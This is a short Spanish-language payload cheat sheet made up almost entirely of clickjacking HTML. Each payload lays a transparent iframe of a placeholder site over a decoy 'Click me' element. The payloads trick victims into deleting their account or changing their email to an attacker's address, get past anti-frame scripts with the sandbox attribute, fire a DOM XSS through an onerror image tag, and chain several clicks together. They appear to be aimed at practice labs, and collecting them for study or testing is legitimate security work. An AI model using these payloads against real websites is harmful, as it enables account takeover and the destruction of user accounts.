-- --
## **Payloads**

- Haciendo que borre su cuenta:
```html
<style>
iframe {
  width: 500px;
  height: 600px;
  opacity: 0.1;
}

div {
  position: absolute;
  top: 500px;
  left: 40px;
}
</style>
<div>Click me</div>
<iframe src="https://URL/my-account"></iframe>
```

- Cambiando email:
```html
<style>
iframe {
  width: 500px;
  height: 600px;
  opacity: 0.1;
}

div {
  position: absolute;
  top: 450px;
  left: 100px;
}
</style>
<div>Click me</div>
<iframe src="https://URL/my-account?email=hacked@hacked.com"></iframe>
```

- Bypasseando script anti frame:
```html
<style>
iframe {
  width: 500px;
  height: 600px;
  opacity: 0.1;
}

div {
  position: absolute;
  top: 450px;
  left: 100px;
}
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://URL/my-account?email=hacked@hacked.com"></iframe>
```

- Explotando DOM XSS:
```html
<style>
iframe {
  width: 500px;
  height: 1000px;
  opacity: 0.1;
}

div {
  position: absolute;
  top: 800px;
  left: 100px;
}
</style>
<div>Click me</div>
<iframe src="https://URL/feedback?name=<img src=0 onerror=print()>&email=test@test.com&subject=test&message=probando"></iframe>
```

- Explotando Clickjacking en multiples pasos
```html
<style>
iframe {
  width: 500px;
  height: 600px;
  opacity: 0.1;
}

.firstClick{
  position: absolute;
  top: 497px;
  left: 80px;
}

.secondClick{
  position: absolute;
  top: 290px;
  left: 200px;
}

</style>

<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://URL/my-account"></iframe>
```